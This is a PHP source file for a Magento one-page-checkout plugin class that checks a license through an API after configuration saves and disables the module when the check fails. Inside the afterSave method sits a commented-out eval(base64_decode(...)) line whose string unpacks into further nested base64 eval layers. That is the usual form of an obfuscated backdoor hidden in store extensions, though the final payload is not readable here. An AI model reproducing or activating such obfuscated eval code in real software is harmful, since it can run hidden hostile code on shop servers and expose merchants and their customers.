<?php

namespace IWD\Opc\Plugin;

use IWD\Opc\Helper\Data as OpcHelper;

class SaveConfig
{
    public $opcHelper;

    public function __construct(
        OpcHelper $opcHelper
    ) {
        $this->opcHelper = $opcHelper;
    }

    public function afterSave($subject, $result)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSWGRHRlhWbGw0V2tkMFZWSnJWalJWTW5CaFdWWktkRlZyZUZwTlZuQXpWakJhVTJOV1JuSk5WbVJUVW14dmVGWnFTalJpTVZWNFYydGthbEp0YUZaWlYzUkxZakZhZFdOSVRrNVdhekV6VmtjMVMxbFZNVlpUYkZwVlZsWktlbFV5ZUVabFZsWjFXa2RHVTFKWVFsVldNakI0VTIxV2MxSnVVbXBTV0ZKelZtcE9VMlJXWkhOaFIzQnJUVlV4TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRYaFRXR3hzVWtad1dGVnNaRk5sYkd4WVpVaGtXRkpVVmxwWk1HUkhWakZhVjJOSWFGaGhNVnB5V1hwQmVHTXlUa2RWYkVwWFVqTm9URlpYY0Vka01rbDRZa2hLYUZKVWJIQlZiRkp5Wld4U1ZsWnFRbFJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVvd1lqRk5lVk5yYUZWWFNFSlRXVzE0ZDJOR2JIUmpla1pxVFZVMVYxWldhR3RaVlRGSlVXdHdWMVo2UVRGWlZWcHJVbXN4VlZGc1dsTmxhMFY0VjJ0U1IyTnRVWGxTYTJoc1VqSjRWVlZzVm5kbGJHUlZVMjVLYTAxSVRqVldSelZUVmpKS2RHRklTbGRoYTFwb1ZHMTRkMUpzWkhOVWJYUnBVbFp3WVZaV1l6RlJNVkpIVkd0a1ZHRnNXbWhWYlRGVFZqRnJkMVpVVms1TlJFWkhXa1ZXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzJKR1pHRlNia0pvVkZWb1UxSldXbGhPV0U1YVZtMVNSMVJzVWs5WGJVWnlZVE5vWVZZemFETldha3BPWlZVMVdHTkZOV2xTYmtJMFZqRlNTbVZHV1hkTlZXUlRWMGQ0VVZacVRsTmhSbHBWVTJ4T2FFMVZOVmRXVm1oclZVWmFjbE5zVmxaV2JVMTRXVlZhYTFOR1ZuVlRiRlpvVFd4R00xZHJZM2hWTVVsM1QxWnNhbEl6VWxoVVZWSlhaVVpaZVdWSE9WVk5iRnA1V1RCU1YyRkZNWFJWYms1aFUwaENSRlpGV2s5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZXWTBST1dGZElRa1JVYTJSUFVqSkZlbUpHWkdsaVJuQjRWa1prTkZsV1JYaGFSbFpWWWtVMWNWVnFSa3ROUmxweldrZDBWbFpzVmpOVk1XaHJWMnN4Y1Zac2FGcGhNVlV4VkZSQmVGSnRVa1pqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpU0VKNlZXeG9hMVpGTVVkVGJFNWFZV3R3Y2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXZDAweFdYbE5XRTVTWWxWc00xbHJXbE5XYlVweVUyNUdWVlpYYUhaYVJFWnJWbFpPYzFwSGRGZE5SRVV4Vm0weE1GTXhaSEpOU0doVVltMVNhRlZ1Y0VkV01XdDNWbTVPVkZZd01UTlViRlpUWVVaYVZsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBFUW1oTlZXdzFXVlZvYTFkck1IbGtSRTVVWld0d1MxcFhlRWRrUjA1SFZXeE9UbFp1UVRKV01WSkRZVEZaZVZac1dteFNiRnBRVmpCb1EyRkdXWGRYYTNSVlRWZDRlRlV5ZUU5VWJGbDNZMFZzVjJKWVVreFdNbk4zWlVaT2RWcEhSbE5sYTFwWVYxZHdRbVZHU2toU2FscGhVbFphVjFadWNITmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlViRUpYVm10d1ZGZFhjRXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsUldWRVpHVkZWak1WUkdWWGxqZWs1TFpWZDBkMVF6WXpsUVUyTndTMVJ6UFNjcEtUcz0nKSk7'));

        if ($subject->getSection() === 'iwd_opc') {
            $isLicenseActive = false;
            $response = $this->opcHelper->requestToApi(true);
            if ($response['secretCode'] === 'iwd4kot_success') {
                $isLicenseActive = true;
            }

            if (!$isLicenseActive) {
                $this->opcHelper->setModuleActive(0);
            }
        }
    
        return $result;
    }
}
